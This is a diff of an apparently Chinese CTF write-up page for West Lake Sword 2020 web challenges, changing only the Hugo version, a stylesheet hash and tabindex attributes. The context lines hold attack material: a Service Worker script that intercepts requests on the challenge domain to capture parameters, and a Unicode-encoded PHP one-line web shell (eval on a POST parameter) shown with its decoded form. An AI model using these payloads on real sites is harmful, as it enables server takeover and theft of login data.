@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,7 +14,7 @@
 
     <title>西湖论剑2020Web复现 | tyskillのBlog</title>
 
-    <link rel="stylesheet" href="/css/meme.min.09e7384df2ebf8f7760291a0d443770f44b39f5563546dd950293ed79e8d779b.css"/>
+    <link rel="stylesheet" href="/css/meme.min.12acc0ca7f74225e7b015741d28e3038696047c86698a0fb722ce126d04c739e.css"/>
 
     
     
@@ -297,7 +297,7 @@
 </code></pre><p>然后上传lua脚本：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -320,7 +320,7 @@
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-lua" data-lang="lua"><span class="n">require</span> <span class="s2">&#34;string&#34;</span>
+<pre tabindex="0" class="chroma"><code class="language-lua" data-lang="lua"><span class="n">require</span> <span class="s2">&#34;string&#34;</span>
 
 <span class="cm">--[[
 </span><span class="cm">     This is the default method name for Lua handlers, see the optional
@@ -368,7 +368,7 @@
 <p>这时转去看源码，得到处理登录功能的js代码：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -404,7 +404,7 @@
 </span><span class="lnt">34
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">callback</span> <span class="o">=</span> <span class="s2">&#34;get_user_login_status&#34;</span><span class="p">;</span>
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="nx">callback</span> <span class="o">=</span> <span class="s2">&#34;get_user_login_status&#34;</span><span class="p">;</span>
 <span class="nx">auto_reg_var</span><span class="p">();</span>
 <span class="k">if</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">jump_url</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;undefined&#34;</span> <span class="o">||</span> <span class="sr">/^\//</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">jump_url</span><span class="p">)){</span>
     <span class="nx">jump_url</span> <span class="o">=</span> <span class="s2">&#34;/&#34;</span><span class="p">;</span>
@@ -443,7 +443,7 @@
 </div><p>发现实现跳转的函数<strong>jsonp</strong>，<u>jsonp可以用于<strong>跨域数据的访问</strong></u>，但是此处存在一个<strong>变量覆盖漏洞</strong>：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -457,7 +457,7 @@
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">auto_reg_var</span><span class="p">(){</span>
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">auto_reg_var</span><span class="p">(){</span>
     <span class="kd">var</span> <span class="nx">search</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
     <span class="kd">var</span> <span class="nx">search_arr</span> <span class="o">=</span> <span class="nx">search</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">);</span>
     <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">search_arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
@@ -481,7 +481,7 @@
 <p>注册Service Worker：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -493,7 +493,7 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">// aaa.js
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">// aaa.js
 </span><span class="c1"></span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span> <span class="o">=</span> <span class="s2">&#34;hardxss.xhlj.wetolink.com&#34;</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">iff</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;iframe&#39;</span><span class="p">);</span>
 <span class="nx">iff</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;https://auth.hardxss.xhlj.wetolink.com/&#39;</span><span class="p">;</span>
@@ -508,7 +508,7 @@
 </div><p>安装和启用Service Worker，并在脚本每次对外访问资源时都拦截相应参数：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -527,7 +527,7 @@
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">// sw.js
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">// sw.js
 </span><span class="c1"></span><span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;install&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
         <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;install ok!&#39;</span><span class="p">);</span>
 <span class="p">});</span>
@@ -558,7 +558,7 @@
 <p>开局给源码</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -594,7 +594,7 @@
 </span><span class="lnt">34
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">include</span> <span class="s1">&#39;security.php&#39;</span><span class="p">;</span>
 <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">])){</span>
     <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
@@ -633,11 +633,11 @@
 </div><p>      在传入一句话木马时发现很多Unicode加密网站在加密时会自动将<code>&lt;&gt;</code>转化为<strong>HTML实体编码</strong>，这样会导致一句话木马无法执行，在此网站<a href="http://www.jsons.cn/unicode/" target="_blank" rel="noopener">http://www.jsons.cn/unicode/</a>生成的Unicode不会自动编码。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="p">{</span><span class="s2">&#34;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&#34;</span><span class="o">:</span><span class="s2">&#34;\u003c\u003f\u0070\u0068\u0070\u0020\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0063\u006d\u0064\u005d\u0029\u003b\u003f\u003e&#34;</span><span class="p">}</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{</span><span class="s2">&#34;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&#34;</span><span class="o">:</span><span class="s2">&#34;\u003c\u003f\u0070\u0068\u0070\u0020\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0063\u006d\u0064\u005d\u0029\u003b\u003f\u003e&#34;</span><span class="p">}</span>
 <span class="c1"># {&#34;content&#34;:&#34;&lt;?php eval($_POST[cmd])?&gt;&#34;}
 </span></code></pre></td></tr></table></div>
 </div>
